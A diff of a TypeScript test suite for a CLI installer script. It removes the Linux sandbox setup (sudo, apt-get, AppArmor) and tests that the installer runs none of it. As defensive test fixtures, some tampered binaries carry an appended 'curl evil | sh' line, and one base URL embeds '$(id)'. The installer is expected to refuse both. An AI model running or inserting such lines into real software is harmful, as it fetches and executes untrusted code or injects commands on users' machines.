@@ -1,10 +1,10 @@
-// scripts/install.sh and scripts/release-assets.sh (CLI-01, SPEC R1 「一行指令安裝」, R5 on Linux). Everything is served
-// from 127.0.0.1 or handed over by a stand-in `curl` (https://downloads.smurg.ai answered from a local copy of the R2
-// bucket's layout: v<X.Y.Z>/ and latest/): no test reaches the network. A fake release (tiny scripts
-// standing in for the four executables), a fake HOME, and stand-ins on PATH for what the installer must not really do
-// here: `uname` (so every OS/arch combination runs on any host), `ldd`, `sysctl`, `id`, `xattr`, `sudo`, `apt-get`,
-// `apparmor_parser`, `tee`. The Linux sandbox checks look below a fake root (SMURG_INSTALL_TEST_SYSROOT), so they give
-// the same answers on a Mac, on a Linux CI runner that has bubblewrap installed, and anywhere else. Nothing runs sudo.
+// scripts/install.sh and scripts/release-assets.sh (CLI-01, SPEC R1 「一行指令安裝」). Everything is served from 127.0.0.1
+// or handed over by a stand-in `curl` (https://downloads.smurg.ai answered from a local copy of the R2 bucket's layout:
+// v<X.Y.Z>/ and latest/): no test reaches the network. A fake release (tiny scripts standing in for the four
+// executables), a fake HOME, and stand-ins on PATH for what the installer must not really do here: `uname` (so every
+// OS/arch combination runs on any host), `ldd`, `sysctl`, `id`, `xattr`; and stand-ins that only record a call for
+// what it must never run at all since the guest sandbox was removed (owner decision 2026-10-01, ARCHITECTURE §11 D-15):
+// `sudo`, `apt-get`, `apparmor_parser`, `tee`, `runuser`, `bwrap`. Nothing runs sudo.
 import { execFile, spawn } from 'node:child_process';
 import { createHash } from 'node:crypto';
 import { existsSync } from 'node:fs';
@@ -34,7 +34,6 @@ const TARGETS: readonly Target[] = [
   { name: 'smurg-linux-x64', uname: ['Linux', 'x86_64'] },
   { name: 'smurg-linux-arm64', uname: ['Linux', 'aarch64'] },
 ];
-const APPARMOR_PROFILE = 'abi <abi/4.0>,\ninclude <tunables/global>\nprofile smurg-bwrap /usr/bin/bwrap flags=(unconfined) {\n  userns,\n}\n';
 
 /** A stand-in executable for one target: says which one it is, and logs that it ran (after the install checks). */
 const fakeBinary = (name: string): string => `#!/bin/sh\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\necho "smurg 9.8.7 (fake ${name})"\n`;
@@ -119,80 +118,42 @@ async function fakeTools(dir: string): Promise<string> {
     `#!/bin/sh\nif [ "\${FAKE_MUSL:-0}" = 1 ]; then echo 'musl libc (x86_64)' >&2; echo 'Version 1.2.4' >&2; exit 1; fi\necho 'ldd (Ubuntu GLIBC 2.39-0ubuntu8) 2.39'\n`,
   );
   await writeExecutable(join(bin, 'sysctl'), `#!/bin/sh\n${log}\n[ -n "\${FAKE_TRANSLATED:-}" ] || { echo "sysctl: unknown oid '$2'" >&2; exit 1; }\necho "$FAKE_TRANSLATED"\n`);
-  // Never root here unless a test says so (FAKE_UID=0), whoever runs the tests: the root branch would run apt-get and
-  // tee directly (their stand-ins below only log "UNEXPECTED direct").
+  // Never root here unless a test says so (FAKE_UID=0), whoever runs the tests.
   await writeExecutable(join(bin, 'id'), `#!/bin/sh\n[ "$1" = -u ] && { echo "\${FAKE_UID:-1000}"; exit 0; }\nexec /usr/bin/id "$@"\n`);
-  // runuser -u USER -- CMD…: logged, then CMD runs with FAKE_AS_USER=USER (a stand-in bwrap can then act as the
-  // unprivileged user the AppArmor restriction applies to).
-  await writeExecutable(join(bin, 'runuser'), `#!/bin/sh\n${log}\n[ "$1" = -u ] || exit 2\nuser="$2"; shift 2; [ "$1" = -- ] && shift\nFAKE_AS_USER="$user" exec "$@"\n`);
   await writeExecutable(
     join(bin, 'xattr'),
     `#!/bin/sh\n${log}\ncase "$1" in\n  -p) [ "\${FAKE_QUARANTINE:-0}" = 1 ] && { echo '0081;00000000;Safari;'; exit 0; }; echo "xattr: $3: No such xattr: $2" >&2; exit 1 ;;\n  -d) exit 0 ;;\nesac\nexit 2\n`,
   );
-  // sudo: logged, never run. `sudo tee FILE` keeps what it was given in $FAKE_TEE_OUT instead of writing FILE.
-  await writeExecutable(
-    join(bin, 'sudo'),
-    `#!/bin/sh\n${log}\nif [ "$1" = tee ]; then cat >"$FAKE_TEE_OUT"; fi\nif [ "$1 $2" = "apt-get install" ]; then exit "\${FAKE_APT_EXIT:-0}"; fi\nexit 0\n`,
-  );
-  for (const tool of ['apt-get', 'apparmor_parser', 'tee']) await writeExecutable(join(bin, tool), `#!/bin/sh\necho "UNEXPECTED direct $(basename "$0") $*" >>"$FAKE_LOG"\nexit 99\n`);
+  // What the installer must never run (there is no guest sandbox to set up): each only records the call.
+  for (const tool of NEVER_RUN) await writeExecutable(join(bin, tool), `#!/bin/sh\necho "UNEXPECTED $(basename "$0") $*" >>"$FAKE_LOG"\nexit 99\n`);
   return bin;
 }
 
-interface Sysroot {
-  readonly tools?: readonly string[];
-  readonly restricted?: '0' | '1';
-  readonly profile?: boolean;
-  /** The body of the stand-in /usr/bin/bwrap (default: `exit 0`, a bubblewrap that can create its namespaces). */
-  readonly bwrap?: string;
-}
-
-/** A fake root for the Linux checks: which tools exist, the AppArmor switch, an existing profile. */
-async function fakeSysroot(dir: string, spec: Sysroot): Promise<string> {
-  const root = join(dir, 'sysroot');
-  await mkdir(root, { recursive: true });
-  for (const tool of spec.tools ?? []) {
-    const body = tool === 'bwrap' && spec.bwrap !== undefined ? spec.bwrap : 'exit 0';
-    await writeExecutable(join(root, tool === 'apparmor_parser' ? 'usr/sbin' : 'usr/bin', tool), `#!/bin/sh\n${body}\n`);
-  }
-  if (spec.restricted !== undefined) {
-    await mkdir(join(root, 'proc/sys/kernel'), { recursive: true });
-    await writeFile(join(root, 'proc/sys/kernel/apparmor_restrict_unprivileged_userns'), `${spec.restricted}\n`);
-  }
-  if (spec.profile) {
-    await mkdir(join(root, 'etc/apparmor.d'), { recursive: true });
-    await writeFile(join(root, 'etc/apparmor.d/smurg-bwrap'), APPARMOR_PROFILE);
-  }
-  return root;
-}
+/** The commands of the guest sandbox's setup, gone from the installer since 2026-10-01 (ARCHITECTURE §11 D-15). */
+const NEVER_RUN = ['sudo', 'apt-get', 'apparmor_parser', 'tee', 'runuser', 'bwrap'] as const;
 
 interface Faked {
   readonly dirs: Dirs;
   readonly env: Record<string, string>;
   readonly log: string;
   readonly prefix: string;
-  readonly teeOut: string;
-  readonly sysroot: string;
   calls(): Promise<string[]>;
 }
 
-async function faked(target: Target, extra: Record<string, string> = {}, sysroot: Sysroot = {}): Promise<Faked> {
+async function faked(target: Target, extra: Record<string, string> = {}): Promise<Faked> {
   const dirs = await setup();
   const bin = await fakeTools(dirs.home);
   const log = join(dirs.home, 'calls.log');
   await writeFile(log, '');
   const tmp = join(dirs.home, 'tmp');
   await mkdir(tmp, { recursive: true });
-  const root = await fakeSysroot(dirs.home, sysroot);
-  const teeOut = join(dirs.home, 'tee.out');
   const env = {
     PATH: `${bin}:${SYSTEM_PATH}`,
     HOME: dirs.home,
     TMPDIR: tmp,
     FAKE_LOG: log,
-    FAKE_TEE_OUT: teeOut,
     FAKE_UNAME_S: target.uname[0],
     FAKE_UNAME_M: target.uname[1],
-    SMURG_INSTALL_TEST_SYSROOT: root,
     ...extra,
   };
   return {
@@ -200,8 +161,6 @@ async function faked(target: Target, extra: Record<string, string> = {}, sysroot
     env,
     log,
     prefix: join(dirs.home, 'opt'),
-    teeOut,
-    sysroot: root,
     calls: async () => (await readFile(log, 'utf8')).split('\n').filter((line) => line !== ''),
   };
 }
@@ -223,7 +182,7 @@ describe('scripts/install.sh on this machine', () => {
     const dirs = await setup();
     const release = await serve({ SHA256SUMS: `${sha('other')}  smurg-linux-riscv\n${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
     const prefix = join(dirs.home, 'opt');
-    const result = await install(dirs, ['--base-url', release.base, '--prefix', prefix, '--no-deps']);
+    const result = await install(dirs, ['--base-url', release.base, '--prefix', prefix]);
     expect(result.out).toContain('已安裝');
     expect(result.code).toBe(0);
     const installed = join(prefix, 'bin', 'smurg');
@@ -240,12 +199,12 @@ describe('scripts/install.sh on this machine', () => {
     const dirs = await setup();
     const prefix = join(dirs.home, 'opt');
     const tampered = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: `${BINARY}curl evil | sh\n` });
-    const bad = await install(dirs, ['--base-url', tampered.base, '--prefix', prefix, '--no-deps']);
+    const bad = await install(dirs, ['--base-url', tampered.base, '--prefix', prefix]);
     expect(bad.code).not.toBe(0);
     expect(bad.out).toContain('sha256 不符');
     await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
     const unlisted = await serve({ SHA256SUMS: `${sha(BINARY)}  smurg-other-thing\n`, [HOST_NAME]: BINARY });
-    const missing = await install(dirs, ['--base-url', unlisted.base, '--prefix', prefix, '--no-deps']);
+    const missing = await install(dirs, ['--base-url', unlisted.base, '--prefix', prefix]);
     expect(missing.code).not.toBe(0);
     expect(missing.out).toContain(`SHA256SUMS 裡沒有 ${HOST_NAME}`);
     // Checked before the ~110 MiB download: the executable was never requested.
@@ -255,13 +214,13 @@ describe('scripts/install.sh on this machine', () => {
 
   it('refuses without a download location, or with one that is not https (http only on this machine)', async () => {
     const dirs = await setup();
-    const none = await install(dirs, ['--no-deps']);
+    const none = await install(dirs, []);
     expect(none.code).toBe(2);
     expect(none.out).toContain('沒有指定下載位置');
-    const plain = await install(dirs, ['--base-url', 'http://downloads.example.invalid/smurg', '--no-deps']);
+    const plain = await install(dirs, ['--base-url', 'http://downloads.example.invalid/smurg']);
     expect(plain.code).toBe(2);
     expect(plain.out).toContain('必須是 https');
-    const odd = await install(dirs, ['--base-url', 'https://example.invalid/$(id)', '--no-deps']);
+    const odd = await install(dirs, ['--base-url', 'https://example.invalid/$(id)']);
     expect(odd.code).toBe(2);
     const unknown = await install(dirs, ['--frobnicate']);
     expect(unknown.code).toBe(2);
@@ -273,7 +232,7 @@ describe('scripts/install.sh on this machine', () => {
     const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
     const script = await readFile(INSTALL, 'utf8');
     for (const shell of SHELLS) {
-      const result = await runShell(shell, ['-s', '--', '--no-deps'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, script);
+      const result = await runShell(shell, ['-s'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, script);
       expect(result.out).toContain('smurg 安裝完成');
       expect(result.code).toBe(0);
       expect(await readFile(join(dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(BINARY);
@@ -304,7 +263,7 @@ describe('scripts/install.sh picks the executable of every OS / architecture (fa
       it(`${target.uname.join(' ')} → ${target.name} (${shell})`, async () => {
         const f = await faked(target);
         const release = await serve(fullRelease());
-        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
+        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
         expect(result.out).toContain(`fake ${target.name}`);
         expect(result.code).toBe(0);
         expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
@@ -318,7 +277,7 @@ describe('scripts/install.sh picks the executable of every OS / architecture (fa
         } else {
           expect(calls.some((call) => call.startsWith('xattr'))).toBe(false);
         }
-        expect(calls.some((call) => call.startsWith('sudo'))).toBe(false);
+        expect(calls.filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
       });
     }
   }
@@ -335,7 +294,7 @@ describe('scripts/install.sh picks the executable of every OS / architecture (fa
     it(`refuses a tampered ${target.name} before running it or touching its attributes`, async () => {
       const f = await faked(target, { FAKE_QUARANTINE: '1' });
       const release = await serve(fullRelease({ [target.name]: `${fakeBinary(target.name)}curl evil | sh\n` }));
-      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
+      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
       expect(result.code).not.toBe(0);
       expect(result.out).toContain(`${target.name} 的 sha256 不符`);
       expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
@@ -347,12 +306,12 @@ describe('scripts/install.sh picks the executable of every OS / architecture (fa
   it('a missing asset is a clear error, nothing installed: the executable of this platform, or SHA256SUMS', async () => {
     const f = await faked(TARGETS[3] as Target);
     const noBinary = await serve(fullRelease({ 'smurg-linux-arm64': undefined }));
-    const result = await runShell('/bin/sh', [INSTALL, '--base-url', noBinary.base, '--prefix', f.prefix, '--no-deps'], f.env);
+    const result = await runShell('/bin/sh', [INSTALL, '--base-url', noBinary.base, '--prefix', f.prefix], f.env);
     expect(result.code).not.toBe(0);
     expect(result.out).toContain(`無法下載 ${noBinary.base}/smurg-linux-arm64（這個平台的執行檔不在發佈裡，或網路中斷），不安裝`);
     expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
     const noSums = await serve(fullRelease({ SHA256SUMS: undefined }));
-    const sums = await runShell('/bin/sh', [INSTALL, '--base-url', noSums.base, '--prefix', f.prefix, '--no-deps'], f.env);
+    const sums = await runShell('/bin/sh', [INSTALL, '--base-url', noSums.base, '--prefix', f.prefix], f.env);
     expect(sums.code).not.toBe(0);
     expect(sums.out).toContain(`無法下載 ${noSums.base}/SHA256SUMS`);
     expect(noSums.requests).toEqual(['/r1/SHA256SUMS']);
@@ -379,7 +338,7 @@ describe('scripts/install.sh picks the executable of every OS / architecture (fa
     const f = await faked(LINUX_X64);
     const broken = '#!/bin/sh\necho "error while loading shared libraries: libstdc++.so.6" >&2\nexit 127\n';
     const release = await serve(fullRelease({ 'smurg-linux-x64': broken, SHA256SUMS: `${sha(broken)}  smurg-linux-x64\n` }));
-    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
+    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
     expect(result.code).not.toBe(0);
     expect(result.out).toContain('libstdc++.so.6');
     expect(result.out).toContain('無法在這台電腦上執行');
@@ -421,131 +380,53 @@ describe('scripts/install.sh on macOS: com.apple.quarantine', () => {
   });
 });
 
-describe('scripts/install.sh on Linux: the guest sandbox needs, with consent only', () => {
-  const missingAll: Sysroot = { tools: ['apt-get', 'apparmor_parser'], restricted: '1' };
+describe('scripts/install.sh installs the executable and nothing else, on every platform (no guest sandbox since 2026-10-01)', () => {
+  for (const shell of SHELLS) {
+    for (const target of TARGETS) {
+      it(`${target.name} (${shell}): no sudo, no system packages, no AppArmor profile, not a word about a sandbox`, async () => {
+        const f = await faked(target);
+        const release = await serve(fullRelease());
+        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
+        expect(result.code).toBe(0);
+        expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
+        expect((await f.calls()).filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
+        expect(result.out).not.toMatch(/sandbox|沙盒|bubblewrap|bwrap|socat|ripgrep|AppArmor|sudo|apt-get/i);
+        expect(result.out).toContain('smurg 安裝完成');
+        // Only the download location was contacted: SHA256SUMS and this machine's executable.
+        expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${target.name}`].sort());
+      });
+    }
+  }
 
-  it('without a terminal and without --yes it asks nobody and runs no sudo: it prints the commands', async () => {
-    const f = await faked(LINUX_X64, {}, missingAll);
+  it('run as root (sudo sh install.sh) it does the same: installs into the prefix it is given and runs nothing else', async () => {
+    const f = await faked(LINUX_X64, { FAKE_UID: '0', SUDO_USER: 'alice' });
     const release = await serve(fullRelease());
     const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
     expect(result.code).toBe(0);
-    expect(result.out).toContain('客人沙盒需要的套件還沒安裝：bubblewrap socat ripgrep');
-    expect(result.out).toContain('sudo apt-get install bubblewrap socat ripgrep');
-    expect(result.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
-    expect(result.out).toContain('profile smurg-bwrap /usr/bin/bwrap flags=(unconfined)');
-    expect(result.out).toContain('客人沙盒需要的套件：還沒安裝');
-    expect(result.out).toContain('AppArmor：還沒處理');
-    const calls = await f.calls();
-    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
-    expect(existsSync(f.teeOut)).toBe(false);
+    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
+    expect((await f.calls()).filter((call) => call.startsWith('UNEXPECTED'))).toEqual([]);
   });
 
-  it('with --yes it installs the packages and the AppArmor profile through sudo, and says so', async () => {
-    const f = await faked(LINUX_X64, {}, missingAll);
-    const release = await serve(fullRelease());
-    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--yes'], f.env);
-    expect(result.code).toBe(0);
-    const calls = await f.calls();
-    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([
-      'sudo apt-get update -qq',
-      'sudo apt-get install -y bubblewrap socat ripgrep',
-      'sudo tee /etc/apparmor.d/smurg-bwrap',
-      'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap',
-    ]);
-    expect(await readFile(f.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
-    expect(result.out).toContain('客人沙盒需要的套件：已安裝：bubblewrap socat ripgrep');
-    expect(result.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap');
-    // Only the real root is written by sudo; the fake root stays as it was.
-    expect(existsSync(join(f.sysroot, 'etc'))).toBe(false);
-  });
-
-  it('asks for nothing that is already there, and a failed apt-get is reported without failing the install', async () => {
-    const ready = await faked(LINUX_X64, {}, { tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true });
-    const release = await serve(fullRelease());
-    const done = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', ready.prefix, '--yes'], ready.env);
-    expect(done.code).toBe(0);
-    expect(done.out).toContain('客人沙盒需要的套件：已經有 bubblewrap、socat、ripgrep');
-    expect(done.out).toContain('AppArmor：已生效（bubblewrap 可以建立客人沙盒）');
-    expect((await ready.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
-
-    const open = await faked(LINUX_X64, { FAKE_APT_EXIT: '100' }, { tools: ['bwrap', 'apt-get'], restricted: '0' });
-    const failed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', open.prefix, '--yes'], open.env);
-    expect(failed.code).toBe(0);
-    expect(failed.out).toContain('套件安裝失敗，請自行安裝：sudo apt-get install socat ripgrep');
-    expect(failed.out).toContain('AppArmor：不需要');
-    expect((await open.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo apt-get update -qq', 'sudo apt-get install -y socat ripgrep']);
-  });
-
-  // review linux-binary F4: the AppArmor step is decided by what bubblewrap can do (the daemon's own probe), not by
-  // whether /etc/apparmor.d/smurg-bwrap exists: a profile file that is not loaded left bubblewrap blocked while the
-  // installer said 「已經有」 and offered nothing.
-  const blockedUntilInstalled = 'if [ -s "$FAKE_TEE_OUT" ]; then exit 0; fi; echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1';
-  const withProfileFile = (bwrap: string): Sysroot => ({ tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true, bwrap });
-
-  it('a profile file that is there but not in effect (bubblewrap still refused) is not taken for done: the fix is printed, and installed with consent', async () => {
-    const release = await serve(fullRelease());
-    const asked = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
-    const printed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', asked.prefix], asked.env);
-    expect(printed.code).toBe(0);
-    expect(printed.out).toContain('/etc/apparmor.d/smurg-bwrap 已經存在，但沒有生效');
-    expect(printed.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
-    expect(printed.out).toContain('AppArmor：還沒處理');
-    expect((await asked.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
-
-    const yes = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
-    const fixed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', yes.prefix, '--yes'], yes.env);
-    expect(fixed.code).toBe(0);
-    expect((await yes.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo tee /etc/apparmor.d/smurg-bwrap', 'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap']);
-    expect(await readFile(yes.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
-    expect(fixed.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap（只放寬 /usr/bin/bwrap）');
-  });
-
-  it('run as root (sudo sh install.sh) the probe runs as the user sudo came from, else nobody: root\'s own bubblewrap passes without the profile, which is not proof (review RV-5)', async () => {
-    const release = await serve(fullRelease());
-    // A bubblewrap without the profile: refused for an unprivileged user, fine for root.
-    const rootOnly = 'if [ -n "${FAKE_AS_USER:-}" ]; then echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1; fi; exit 0';
-    const sysroot: Sysroot = { tools: ['bwrap', 'socat', 'rg', 'apparmor_parser'], restricted: '1', bwrap: rootOnly };
-    for (const [env, user] of [
-      [{ FAKE_UID: '0', SUDO_USER: 'alice' }, 'alice'],
-      [{ FAKE_UID: '0' }, 'nobody'],
-      [{ FAKE_UID: '0', SUDO_USER: 'root' }, 'nobody'],
-    ] as const) {
-      const f = await faked(LINUX_X64, env, sysroot);
-      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
-      expect(result.code, user).toBe(0);
-      expect(result.out, user).toContain('AppArmor：還沒處理');
-      expect(result.out, user).not.toContain('已生效');
-      expect(result.out, user).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
-      expect((await f.calls()).filter((call) => call.startsWith('runuser')), user).toEqual([`runuser -u ${user} -- ${f.sysroot}/usr/bin/bwrap --unshare-user --unshare-net --ro-bind / / -- /bin/true`]);
-      expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call)), user).toEqual([]);
+  it('--help offers only the download location and the prefix; the sandbox options are gone', async () => {
+    const dirs = await setup();
+    const help = await install(dirs, ['--help']);
+    expect(help.code).toBe(0);
+    expect(help.out).toContain('用法：sh install.sh [--base-url 網址] [--prefix 資料夾]');
+    expect(help.out).not.toMatch(/--yes|--no-deps|沙盒|sudo/);
+    for (const option of ['--yes', '--no-deps']) {
+      const refused = await install(dirs, ['--base-url', 'https://downloads.smurg.ai/v9.8.7', option]);
+      expect(refused.code, option).toBe(2);
+      expect(refused.out, option).toContain(`不認得的參數 ${option}`);
     }
-    // With the profile in effect the user's bubblewrap works too: then it is.
-    const loaded = await faked(LINUX_X64, { FAKE_UID: '0', SUDO_USER: 'alice' }, { ...sysroot, bwrap: 'exit 0' });
-    const ok = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', loaded.prefix], loaded.env);
-    expect(ok.out).toContain('AppArmor：已生效');
   });
 
-  it('a bubblewrap that fails for another reason is not blamed on AppArmor; without bubblewrap the file alone is reported as unconfirmed', async () => {
-    const release = await serve(fullRelease());
-    const other = await faked(LINUX_X64, {}, withProfileFile('echo "bwrap: execvp /bin/true: No such file or directory" >&2; exit 1'));
-    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', other.prefix, '--yes'], other.env);
-    expect(result.code).toBe(0);
-    expect(result.out).toContain('AppArmor：無法確認（bubblewrap：bwrap: execvp /bin/true: No such file or directory；smurg host 會再檢查）');
-    expect((await other.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
-
-    const noBwrap = await faked(LINUX_X64, {}, { tools: ['socat', 'rg', 'apparmor_parser'], restricted: '1', profile: true });
-    const checked = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', noBwrap.prefix], noBwrap.env);
-    expect(checked.code).toBe(0);
-    expect(checked.out).toContain('AppArmor：已經有 /etc/apparmor.d/smurg-bwrap（還沒有 bubblewrap 可以確認是否生效；smurg host 會檢查）');
-  });
-
-  it('--no-deps checks nothing', async () => {
-    const f = await faked(LINUX_X64, {}, missingAll);
-    const release = await serve(fullRelease());
-    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps', '--yes'], f.env);
-    expect(result.code).toBe(0);
-    expect(result.out).toContain('沒有檢查（--no-deps）');
-    expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
+  it('the script itself has no sandbox, sudo, apt-get or AppArmor step left', async () => {
+    const script = await readFile(INSTALL, 'utf8');
+    const code = script
+      .split('\n')
+      .filter((line) => !/^\s*#/.test(line))
+      .join('\n');
+    expect(code).not.toMatch(/sudo|apt-get|apparmor|bwrap|bubblewrap|socat|ripgrep|runuser|沙盒|SMURG_INSTALL_TEST_SYSROOT/i);
   });
 });
 
@@ -560,13 +441,13 @@ describe('scripts/install.sh: how to put the executable on PATH', () => {
     ];
     for (const [target, shell, file] of cases) {
       const f = await faked(target, { SHELL: shell });
-      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
+      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
       expect(result.code).toBe(0);
       expect(result.out).toContain(`請把這一行加到 ${file}`);
       expect(result.out).toContain(`export PATH="${join(f.prefix, 'bin')}:$PATH"`);
     }
     const f = await faked(LINUX_X64);
-    const onPath = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], { ...f.env, PATH: `${join(f.prefix, 'bin')}:${f.env['PATH'] as string}` });
+    const onPath = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], { ...f.env, PATH: `${join(f.prefix, 'bin')}:${f.env['PATH'] as string}` });
     expect(onPath.code).toBe(0);
     expect(onPath.out).not.toContain('不在 PATH 裡');
   });
@@ -580,7 +461,7 @@ describe('scripts/release-assets.sh → the R2 layout → install.sh (https://do
   const FAKE_NODE = '22.23.3';
   /** Notices as scripts/build-sea.sh writes them: the packages, then the Node.js section with its LICENSE. */
   const noticesOf = (node: string): string =>
-    `smurg: third-party notices\n\nnode-pty@1.2.0  MIT\n@parcel/watcher@2.6.0  MIT\n@anthropic-ai/sandbox-runtime@0.0.77  Apache-2.0\n\n${'='.repeat(80)}\nnode@${node} (the Node.js runtime)\nLicense: MIT\n\n----- LICENSE -----\nNode.js is licensed for use as follows:\n\nCopyright Node.js contributors. All rights reserved.\n`;
+    `smurg: third-party notices\n\nnode-pty@1.2.0  MIT\n@parcel/watcher@2.6.0  MIT\n\n${'='.repeat(80)}\nnode@${node} (the Node.js runtime)\nLicense: MIT\n\n----- LICENSE -----\nNode.js is licensed for use as follows:\n\nCopyright Node.js contributors. All rights reserved.\n`;
   const NOTICES_TEXT = noticesOf(FAKE_NODE);
   const CHANGELOG = '# 變更紀錄\n\n## [9.9.0] - later\n\n- not this one\n\n## [9.8.7] - 2026-10-01\n\n第一版（[主人指南](docs/HOSTING.md#1-安裝)、[外部](https://example.com/x)、[錨點](#已知限制)）。\n\n### 已知限制\n\n- 很多。\n\n## [9.8.6] - 2026-09-30\n\n- older\n';
 
@@ -686,7 +567,7 @@ describe('scripts/release-assets.sh → the R2 layout → install.sh (https://do
     // https://smurg.ai/install.sh is a 302 to latest/install.sh: what `sh` reads is that file.
     const latest = await readFile(join(bucket, 'latest', 'install.sh'), 'utf8');
     for (const shell of SHELLS) {
-      const result = await runShell(shell, ['-s', '--', '--no-deps'], f.env, latest);
+      const result = await runShell(shell, ['-s'], f.env, latest);
       expect(result.out).toContain(`smurg 9.8.7 (fake smurg-linux-x64, node ${FAKE_NODE})`);
       expect(result.code).toBe(0);
       expect(result.out).toContain('smurg 的授權條款：https://smurg.ai/license/');
@@ -706,7 +587,7 @@ describe('scripts/release-assets.sh → the R2 layout → install.sh (https://do
     // A version's own installer keeps installing that version (curl -fsSL https://downloads.smurg.ai/v9.8.6/install.sh | sh).
     const pinned = await faked(LINUX_X64);
     await r2Curl(pinned, bucket);
-    const old = await runShell('/bin/sh', ['-s', '--', '--no-deps'], pinned.env, await readFile(join(bucket, 'v9.8.6', 'install.sh'), 'utf8'));
+    const old = await runShell('/bin/sh', ['-s'], pinned.env, await readFile(join(bucket, 'v9.8.6', 'install.sh'), 'utf8'));
     expect(old.code).toBe(0);
     expect(await readFile(join(pinned.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeOf('smurg-linux-x64', '9.8.6'));
     expect((await pinned.calls()).filter((call) => call.startsWith('curl ')).every((call) => call.includes(' https://downloads.smurg.ai/v9.8.6/'))).toBe(true);
@@ -778,8 +659,11 @@ describe('scripts/release-assets.sh → the R2 layout → install.sh (https://do
     const partial = await releaseDirs(dirs, { sub: 'partial', notices: 'node-pty  MIT\nNode.js\n' });
     const short = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out]);
     expect(short.code).toBe(1);
-    expect(short.out).toContain('does not mention @parcel/watcher @anthropic-ai/sandbox-runtime');
+    expect(short.out).toContain('does not mention @parcel/watcher (bundled in every executable)');
     expect(existsSync(partial.out)).toBe(false);
+
+    // Nothing of the guest sandbox is required (there is none: ARCHITECTURE §11 D-15).
